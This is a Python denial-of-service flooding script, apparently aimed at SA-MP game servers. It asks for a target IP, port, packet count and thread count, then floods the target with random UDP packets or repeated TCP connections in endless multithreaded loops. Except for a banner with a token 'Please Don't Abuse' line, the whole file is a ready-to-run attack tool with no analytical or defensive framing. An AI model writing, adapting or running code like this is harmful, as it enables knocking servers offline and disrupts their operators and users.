#RenameGuaTembakPalalu
#Author : ΣXCITΣD 13
import random
import socket
import threading
import os
import sys

os.system("clear")

print("""\033[1;31;40m""")

print("--- AUTHOR BY : ΣXCITΣD 13 ---")
print("--- TOOLS BY : ΣXCITΣD 13 ---")
print("---   Please Don't Abuse ---")
print("===================================")
print("DDOS SAMP, ULTRA - HOST, ΣXCITΣD 13")
print("========== VERSION 1.0 ============")
ip = str(input(" IP:"))
port = int(input(" Port:"))
choice = str(input(" UDP?(y/n):"))
times = int(input(" Package:"))
threads = int(input(" Threads:"))
def run():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"ΣXCITΣD 13")
    except:
      print("DOWN!!!")

def run2():
  data = random._urandom(16)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +" ΣXCITΣD 13!!! ")
    except:
      s.close()
      print("[*] Error")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()
